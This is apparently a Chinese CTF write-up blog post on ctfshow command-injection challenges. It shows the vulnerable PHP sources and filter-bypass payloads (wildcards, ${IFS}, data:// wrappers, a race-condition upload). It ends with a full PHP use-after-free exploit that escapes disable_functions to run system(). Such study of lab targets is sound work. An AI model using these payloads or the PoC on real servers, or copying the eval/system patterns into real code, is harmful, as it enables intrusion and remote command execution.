---
title: ctfshow03
date: '2024-9-8 13:46'
description: 命令执行刷题
abbrlink: 3502c2fc
---

> ## 刷题

> **web32**

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:56:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

> **37**

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:13:21
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
} 
//直接rce即可
?c=data://text/plain,<?php system('cat fl*')?>
```

> **web40**,无参数读取文件

```php
//首先介绍一下这几个函数
getpwd() - 获取当前php所在目录
scandir() - 列出指定路径中所有的文件和目录
array_reverse() - 返回单元顺序相反的数组
current() - 返回数组中的当前值
end() - 将数组的内部指针指向最后一个单元
prev() - 将数组的内部指针倒回一位
reset() - 将数组的内部指针指向第一个单元
each() - 返回数组中当前的键／值对并将数组指针向前移动一步
    
<?php 
// var_dump(scandir(getcwd())) ;
$transport=array('foot','bike','car','plane');
// $mode=current($transport);   // $mode = 'foot';
$mode = next(next($transport));    // $mode = 'bike';
// $mode = next($transport);    // $mode = 'car'; 两次next
// $mode = prev($transport);    // $mode = 'bike'; 一次prev 往前
// $mode = end($transport);     // $mode = 'plane'; 直接取得最后一个
//能直接用的就是 current() next() end()
echo $mode;


```



```php
查看当前工作目录getcwd()，扫描当前目录及文件"scandir()"输出 为数组，flag.php 在倒数第二个个位置那就数组倒置array_revers()，变为正数第二，在使用next()函数指向从第一个指向第二个（及指向flag.php）,最后使用show_source（）查看文件的内容 ?c=print_r(show_source(next(array_reverse(scandir(getcwd())))));

url+?c=print_r(getcwd()); ===> /var/www/html

url+?c=print_r(scandir(getcwd())); ===> Array ( [0] => . [1] => .. [2] => flag.php [3] => index.php )

url+?c=print_r(array_reverse(scandir(getcwd()))); ==> Array ( [0] => index.php [1] => flag.php [2] => .. [3] => . )

url+?c=print_r(next(array_reverse(scandir(getcwd())))); ==> flag.php

url+?c=print_r(show_source(next(array_reverse(scandir(getcwd()))))); ==> $flag="ctfshow{eca2e7df-d196-4b71-9632-ad4d32e194d3}";

```



> **Web51**

`看看常见过滤`

```php
<?php
 if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

没过滤`nl`,`vi`,`tac`命令

空格用`<`绕过,后面继续用`||`截断即可!

payload:`c=vi<fla\g.php||`,`c=nl<fla\g.php||`



> **Web52** 这个过滤有点哈人!

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 19:43:42
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 
```

```bash
善用?占位符
/bin/ca?${IFS}???g.php
这里有个小trick,里面直接用ca?不能直接定位到cat命令,/bin/ca?可以!
包括/bin/n? 应该也是可以直接定位到nl命令的!,不过不过,这里的nl并非我们想要的nl命令!!!
我们想要的nl命令在 /usr/bin/nl 
┌──(root㉿kali)-[/var/www/html]
└─# type nl        
nl is /usr/bin/nl 可以这样查询!

甚至可以这样的姿势?--->/??n/??t${IFS}????????

当然这题有漏网之鱼
c=grep${IFS}-r${IFS}'ctfshow'${IFS}.
```

> **Web55** bash无字母rce

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 20:03:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 
```

> **Web56**,条件竞争写入/tmp shell脚本并执行

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
} 
```

`我勒个过滤,只能耍赖咯!`

数据包:

```html
POST /?c=.%20/???/????????[@-[] HTTP/1.1
Host: 242588a5-a627-4694-98e4-4d7daecf188a.challenge.ctf.show
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: PHPSESSID=86vjn4hae6i2238p0rlc5bgcv1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept-Encoding: gzip, deflate
Sec-GPC: 1
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------123

----------123
Content-Disposition:form-data;name="file";filename="1.txt"

#!/bin/bash

cat flag.php
----------123--
```

> **Web57** 全过滤

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-08 01:02:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
} 
```

`看似所有的路都被堵死了`

如何构造出36才是重点,呜呜呜呜

**bash下面其实也是有无字母数字rce的~**

[【bashfuck】bashshell无字母命令执行原理 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/system/361101.html)

> **Web58**

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
} 
```

**存在禁用函数的waf,想到用文件包含或者直接highlight_file(flag.php)**

> **web71**,多了一个啥玩意ob_end_clean();函数

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}

?>

你要上天吗？
```

看了题解发现可以用提前截断的思路!

```wp

提前送出缓冲区或终止程序

        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);

源码劫持了输出缓冲并且将数字和字母替换成了?。
法一

在劫持输出缓冲区之前就把缓冲区送出，可以用的函数有：

ob_flush();
ob_end_flush();

payload示例：

c=include('/flag.txt');ob_flush();

法二

提前终止程序，即执行完代码直接退出，可以调用的函数有：

exit();
die();

payload示例：

c=include('/flag.txt');exit();

```

> **Web72**,限制  open_basedir() 无法访问其他目录文件

`bypass open_basedir() ` 

`uaf poc`

```php
//报错提示
Warning: error_reporting() has been disabled for security reasons in /var/www/html/index.php on line 14

Warning: ini_set() has been disabled for security reasons in /var/www/html/index.php on line 15

Warning: include(/flag.txt): failed to open stream: No such file or directory in /var/www/html/index.php(19) : eval()'d code on line 1

Warning: include(): Failed opening '/flag.txt' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php(19) : eval()'d code on line 1
```

```php
//查看flag 文件的位置
c=?><?php $a=new DirectoryIterator("glob:///*"); foreach($a as $f) {echo($f->__toString().' ');} exit(0); ?>
//绕过脚本,待研究!
    <?php
function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { 

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }


    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");ob_end_flush();
?>


```

